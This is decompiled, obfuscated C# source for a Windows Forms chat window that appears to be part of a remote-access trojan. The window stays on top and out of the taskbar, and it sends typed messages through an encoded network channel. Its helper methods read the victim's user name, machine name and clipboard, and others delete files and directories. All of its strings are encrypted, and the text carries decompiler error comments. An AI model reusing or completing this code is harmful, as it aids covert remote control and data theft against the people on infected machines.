using System;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace O;

[DesignerGenerated]
public class GForm0 : Form
{
	private Class19.Class20.Class21 class21_0 = new Class19.Class20.Class21();

	internal TextBox textBox_0;

	internal IContainer icontainer_0;

	protected override object CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(Class5.smethod_5<CreateParams>(createParams, 'Ϋ', (short)907) | 0x200);
			return createParams;
		}
	}

	public GForm0()
	{
		GForm1.smethod_1<EventHandler, Form>((Form)(object)this, (EventHandler)method_0, 'ȇ', (short)544);
		Class12.smethod_2<Control, EventHandler>((Control)(object)this, (EventHandler)method_3, (short)992, 'Ϲ');
		method_2();
	}

	private void method_0(object sender, EventArgs e)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		Class5.smethod_1<RichTextBox, string>(vmethod_3(), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf828\uf804\uf805\uf805\uf80e\uf808\uf81f\uf80e\uf80f\uf84b\uf845\uf845", 63584), 60753), 60904), 'ʀ', 646);
		TextBoxBase val = (TextBoxBase)vmethod_3();
		RichTextBox gparam_ = (RichTextBox)val;
		((RichTextBox)val).set_Text(GForm0.smethod_0<RichTextBox>(gparam_, (short)629, 530) + smethod_1(441, 489) + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf\ueacf", 61617), 61401), 62784));
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_0(TextBox textBox_1)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		KeyPressEventHandler val = new KeyPressEventHandler(method_1);
		TextBox val2 = (TextBox)(TextBoxBase)textBox_0;
		if (val2 != null)
		{
			Class5.smethod_2<Control, KeyPressEventHandler>((Control)(object)val2, val, 27, (short)99);
		}
		TextBox val3 = (textBox_0 = textBox_1);
		val2 = (TextBox)(TextBoxBase)textBox_0;
		if (val2 != null)
		{
			((Control)val2).add_KeyPress(val);
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_1()
	{
		return textBox_0;
	}

	private void method_1(object sender, KeyPressEventArgs e)
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_00ab: Expected O, but got Unknown
		if (e.get_KeyChar() == '\r' && Class11.smethod_7(Class11.smethod_6<TextBox>(vmethod_1(), 941, 918), "", bool_0: false, 'A', 'y') != 0)
		{
			TextBoxBase val = (TextBoxBase)vmethod_3();
			RichTextBox gparam_ = (RichTextBox)val;
			Class5.smethod_1<RichTextBox, string>((RichTextBox)val, Class4.smethod_0(GForm0.smethod_0<RichTextBox>(gparam_, (short)907, 1004), smethod_1(22, 70), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﷰ\ufde6\ufdceﷶﶋ\ufd91ﶋ", 62880), 58006), 59952), Class11.smethod_6<TextBox>(vmethod_1(), 5, 62), 231, 190), 'Ɏ', 584);
			((GClass1)((Class6.Class7)Class6.Object_2).method_1().GClass1_0).Send(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1f5\ue1e2\ue1e4\ue1f1\ue1fb\ue1d2\ue1c6\ue1c4\ue1c8\ue1c3\ue1c2\ue1d5\ue1fb", 58598), 62741), 61668) + vmethod_1().get_Text());
			vmethod_1().set_Text("");
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_2(RichTextBox richTextBox_0)
	{
		class21_0.richTextBox_0 = richTextBox_0;
	}

	[SpecialName]
	internal virtual RichTextBox vmethod_3()
	{
		return class21_0.richTextBox_0;
	}

	private void method_2()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Expected O, but got Unknown
		//IL_01eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ff: Expected O, but got Unknown
		vmethod_2(new RichTextBox());
		vmethod_0(new TextBox());
		((Control)this).SuspendLayout();
		((TextBoxBase)vmethod_3()).set_BackColor(GClass2.DRV.smethod_4('\u0348', 859));
		((TextBoxBase)vmethod_3()).set_BorderStyle((BorderStyle)1);
		((Control)vmethod_3()).set_Dock((DockStyle)5);
		Class4.smethod_2<RichTextBox, Font>(vmethod_3(), new Font(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("辰磊聾淚磊車亮參", 58075), 61488), 60231), 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0), (short)768, 778);
		vmethod_3().set_ForeColor(Class5.smethod_7(1018, 997));
		Class3.smethod_3<Control>((Control)(object)vmethod_3(), new Point(0, 0), 309, 'Ŷ');
		((Control)vmethod_3()).set_Name(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﯙﯮﯨﯽ", 63005), 60579), 57740));
		((TextBoxBase)vmethod_3()).set_ReadOnly(true);
		GForm1.smethod_13<Control>((Control)(object)vmethod_3(), new Size(392, 188), (short)543, 'ɬ');
		((Control)vmethod_3()).set_TabIndex(15);
		Class5.smethod_1<RichTextBox, string>(vmethod_3(), "", 'ş', 345);
		Class5.smethod_9<TextBox>(vmethod_1(), bool_0: true, 'ȉ', (short)523);
		((TextBoxBase)vmethod_1()).set_AcceptsTab(true);
		Class12.smethod_11<TextBoxBase>((TextBoxBase)(object)vmethod_1(), GClass2.DRV.smethod_4('G', 84), 352, (short)280);
		GClass2.smethod_8<TextBoxBase>((TextBoxBase)(object)vmethod_1(), (BorderStyle)1, 'ɦ', 519);
		GForm0.smethod_4<Control>((Control)(object)vmethod_1(), (DockStyle)2, (short)972, '\u0383');
		Class14.smethod_7<Control, Font>((Control)(object)vmethod_1(), new Font(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("辰磊聾淚磊車亮參", 58075), 61488), 60231), 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0), 221, 143);
		Class10.smethod_5<TextBoxBase>((TextBoxBase)(object)vmethod_1(), GClass2.DRV.smethod_4('\u0369', 893), (short)702, 'ʊ');
		Class3.smethod_3<Control>((Control)(object)vmethod_1(), new Point(0, 188), 415, 'ǜ');
		((TextBoxBase)vmethod_1()).set_MaxLength(999999);
		Class4.smethod_4<string, Control>((Control)(object)vmethod_1(), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf4a6\uf490\uf49b\uf491\uf497\uf49a\uf48d", 61810), 59296), 57950), (short)1013, 'ϰ');
		GForm1.smethod_13<Control>((Control)(object)vmethod_1(), new Size(392, 22), (short)346, 'ĩ');
		GForm1.smethod_16<Control>((Control)(object)vmethod_1(), 14, 'ŝ', (short)324);
		GForm1.smethod_17<ContainerControl>((ContainerControl)(object)this, new SizeF(6f, 13f), 'ɩ', 638);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		GClass2.DRV.smethod_8<Form>((Form)(object)this, new Size(392, 210), 'ˤ', 'ʓ');
		GClass1.smethod_7<Control>((Control)(object)this, 10, '~').Add((Control)(object)vmethod_3());
		GClass1.smethod_7<Control>((Control)(object)this, 850, '\u0326').Add((Control)(object)vmethod_1());
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf59e", 59965), 61726), 61116));
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue89c\ue8b7\ue8be\ue8ab\ue8b6\ue8b1\ue8b8\ue8ff\ue888\ue8b6\ue8ab\ue8b7\ue8ff\ue8e1\ue8e1\ue8ff\ue884\ue8a1\ue897\ue8be\ue8bc\ue8b4\ue8ba\ue8ad\ue8a1\ue882", 59263), 58591), 60412));
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		GClass2.smethod_9<TextBoxBase>((TextBoxBase)(object)vmethod_3(), 855, (short)889);
	}

	internal static string smethod_0<T>(T gparam_0, short short_0, int int_0) where T : RichTextBox
	{
		int num = 0;
		string result = (((int_0 ^ short_0) - 103) ^ 0) switch
		{
			0 => (string)(IEnumerable)((RichTextBox)gparam_0).get_Text(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_1(short short_0, int int_0)
	{
		int num = 0;
		string result = (((int_0 ^ short_0) - 80) ^ 0) switch
		{
			0 => (string)(IComparable)Environment.NewLine, 
			1 => (string)(IComparable)Environment.UserName, 
			2 => (string)(IComparable)Environment.MachineName, 
			3 => (string)(IComparable)Clipboard.GetText(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static DateTime smethod_2<T>(T gparam_0, short short_0, short short_1) where T : Clock
	{
		int num = 0;
		DateTime result;
		do
		{
			result = (((short_0 ^ short_1) - 108) ^ num) switch
			{
				0 => ((Clock)gparam_0).get_LocalTime(), 
				_ => default(DateTime), 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static void smethod_3<T>(T gparam_0, int int_0, int int_1) where T : string
	{
		int num = 0;
		switch (((int_0 ^ int_1) - 33) ^ 0)
		{
		case 0:
			File.Delete(gparam_0);
			break;
		case 1:
			Clipboard.SetText((string)gparam_0);
			break;
		case 2:
			Directory.Delete(gparam_0);
			break;
		}
		num++;
	}

	internal static void smethod_4<T>(T gparam_0, DockStyle dockStyle_0, short short_0, char char_0) where T : Control
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		int num2;
		do
		{
			switch (((char_0 ^ short_0) - 79) ^ num)
			{
			case 0:
				((Control)gparam_0).set_Dock(dockStyle_0);
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}
}
